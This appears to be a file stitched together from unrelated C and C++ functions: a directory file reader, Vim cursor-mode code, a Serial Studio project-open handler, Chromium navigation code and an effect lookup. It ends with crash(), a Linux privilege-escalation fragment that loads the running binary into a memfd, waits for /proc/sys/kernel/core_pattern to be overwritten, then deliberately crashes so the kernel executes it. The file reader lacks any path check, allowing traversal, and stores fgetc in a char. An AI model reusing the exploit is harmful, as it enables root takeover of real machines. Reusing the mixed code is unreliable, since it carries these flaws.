char *read_file_from_dir(const char *filename, const char *dir_path) {
    char* empty_result = malloc(1);
    empty_result[0] = '\0';
    char file_path[1024];
    snprintf(file_path, sizeof(file_path), "%s/%s", dir_path, filename);
    FILE *file = fopen(file_path, "r");
    if (file == NULL) {
        return empty_result;
    }
    char *content = NULL;
    size_t content_size = 0;
    char ch;
    while ((ch = fgetc(file)) != EOF) {
        content = realloc(content, content_size + 1);
        content[content_size++] = ch;
    }
    fclose(file);
    content = realloc(content, content_size + 1);
    content[content_size] = '\0';
    free(empty_result);
    return content;
}

term_cursor_mode(int forced)
{
    static int showing_mode = -1;
    char_u *p;

    // Only do something when redrawing the screen and we can restore the
    // mode.
    if (!full_screen || *T_CEI == NUL)
    {
# ifdef FEAT_TERMRESPONSE
	if (forced && initial_cursor_shape > 0)
	    // Restore to initial values.
	    term_cursor_shape(initial_cursor_shape, initial_cursor_blink);
# endif
	return;
    }

    if ((State & MODE_REPLACE) == MODE_REPLACE)
    {
	if (forced || showing_mode != MODE_REPLACE)
	{
	    if (*T_CSR != NUL)
		p = T_CSR;	// Replace mode cursor
	    else
		p = T_CSI;	// fall back to Insert mode cursor
	    if (*p != NUL)
	    {
		out_str(p);
		showing_mode = MODE_REPLACE;
	    }
	}
    }
    else if (State & MODE_INSERT)
    {
	if ((forced || showing_mode != MODE_INSERT) && *T_CSI != NUL)
	{
	    out_str(T_CSI);	    // Insert mode cursor
	    showing_mode = MODE_INSERT;
	}
    }
    else if (forced || showing_mode != MODE_NORMAL)
    {
	out_str(T_CEI);		    // non-Insert mode cursor
	showing_mode = MODE_NORMAL;
    }
}

API::CommandResponse API::Handlers::ProjectHandler::fileOpen(const QString& id,
                                                             const QJsonObject& params)
{
  if (!params.contains(QStringLiteral("filePath"))) {
    return CommandResponse::makeError(
      id, ErrorCode::MissingParam, QStringLiteral("Missing required parameter: filePath"));
  }

  const QString file_path = params.value(QStringLiteral("filePath")).toString();
  if (file_path.isEmpty()) {
    return CommandResponse::makeError(
      id, ErrorCode::InvalidParam, QStringLiteral("filePath cannot be empty"));
  }

  if (!API::isPathAllowed(file_path)) {
    return CommandResponse::makeError(
      id, ErrorCode::InvalidParam, QStringLiteral("filePath is not allowed"));
  }

  const bool isDryRun = params.value(QStringLiteral("dryRun")).toBool(false);

  if (isDryRun) {
    QFile f(file_path);
    if (!f.open(QIODevice::ReadOnly | QIODevice::Text))
      return CommandResponse::makeError(
        id,
        ErrorCode::OperationFailed,
        QStringLiteral("DRY RUN: cannot read filePath '%1'").arg(file_path));

    QJsonParseError err{};
    const auto doc = QJsonDocument::fromJson(f.readAll(), &err);
    f.close();
    if (err.error != QJsonParseError::NoError || !doc.isObject())
      return CommandResponse::makeError(
        id,
        ErrorCode::InvalidParam,
        QStringLiteral("DRY RUN: filePath does not contain a valid project JSON object."));

    QJsonObject result;
    result[QStringLiteral("dryRun")]       = true;
    result[QStringLiteral("filePath")]     = file_path;
    result[QStringLiteral("wouldDiscard")] = summarizeCurrentProject();
    result[QStringLiteral("wouldApply")]   = summarizeProjectJson(doc.object());
    result[QStringLiteral("warning")] =
      QStringLiteral("DRY RUN: no project was loaded. wouldDiscard shows what would be lost; "
                     "wouldApply shows what would replace it. Confirm before re-issuing "
                     "without dryRun:true.");
    return CommandResponse::makeSuccess(id, result);
  }

  DataModel::ProjectModel::instance().setSuppressMessageBoxes(true);
  const bool ok = DataModel::ProjectModel::instance().openJsonFile(file_path);
  DataModel::ProjectModel::instance().setSuppressMessageBoxes(false);

  if (!ok) {
    return CommandResponse::makeError(
      id,
      ErrorCode::OperationFailed,
      QStringLiteral("Failed to open project file (validation or I/O error)"));
  }

  AppState::instance().setOperationMode(SerialStudio::ProjectFile);

  QJsonObject result;
  result[QStringLiteral("filePath")] = DataModel::ProjectModel::instance().jsonFilePath();
  result[QStringLiteral("title")]    = DataModel::ProjectModel::instance().title();
  return CommandResponse::makeSuccess(id, result);
}

void RenderWidgetHostImpl::DidNavigate(uint32_t next_source_id) {
current_content_source_id_ = next_source_id;
did_receive_first_frame_after_navigation_ = false;

if (enable_surface_synchronization_) {
// Resize messages before navigation are not acked, so reset
// |visual_properties_ack_pending_| and make sure the next resize will be
// acked if the last resize before navigation was supposed to be acked.
visual_properties_ack_pending_ = false;
    viz::LocalSurfaceId old_surface_id = view_->GetLocalSurfaceId();
if (view_)
view_->DidNavigate();
    viz::LocalSurfaceId new_surface_id = view_->GetLocalSurfaceId();
    // If |view_| didn't allocate a new surface id, then don't start
    // |new_content_rendering_timeout_|. Two reasons:
    //  1. It's not needed (because this was the first navigation event)
    //  2. If we don't change the surface id, then we will not get the call to
    //     OnFirstSurfaceActivation, and not stop the timer (even if we get new
    //     frames).
    // https://crbug.com/853651, https://crbug.com/535375
    if (old_surface_id == new_surface_id)
      return;
} else {
// It is possible for a compositor frame to arrive before the browser is
// notified about the page being committed, in which case no timer is
// necessary.
if (last_received_content_source_id_ >= current_content_source_id_)
return;
}

if (!new_content_rendering_timeout_)
return;

new_content_rendering_timeout_->Start(new_content_rendering_delay_);
}

static struct effect *find_effect(const char *name)
{
	struct effect *hit = NULL;
	int hits = 0;

	for (int i = 0; i < (int)ARRAY_SIZE(effects); i++) {
		bool exact;

		if (!name_hit(effects[i]->name, name, &exact))
			continue;
		if (exact)
			return effects[i];
		hit = effects[i];
		hits++;
	}

	if (hits == 1)
		return hit;

	fprintf(stderr, hits ? "'%s' is ambiguous.  It could be:\n"
			     : "There is no effect called '%s'.  There is:\n",
		name);
	for (int i = 0; i < (int)ARRAY_SIZE(effects); i++) {
		bool exact;

		if (!hits || name_hit(effects[i]->name, name, &exact))
			fprintf(stderr, "    %s\n", effects[i]->name);
	}
	exit(1);
}

void crash(int fd)
{
    int memfd = memfd_create("", 0);
    sendfile(memfd, open("main", 0), 0, 0xffffffff);
    dup2(memfd,fd);
    close(memfd);
    char dst[0x100] = {};
    snprintf(dst,sizeof(dst),"|/proc/%%P/fd/%d",fd);
    while (1)
    {
        // Check if /proc/sys/kernel/core_pattern has been overwritten
        char buf[0x100] = {};
        int core = open("/proc/sys/kernel/core_pattern", 0);
        read(core, buf, sizeof(buf));
        close(core);
        if(strncmp(buf, dst, strlen(dst)) == 0)
            *(size_t *)0 = 0;
        sleep(1);
    }

}

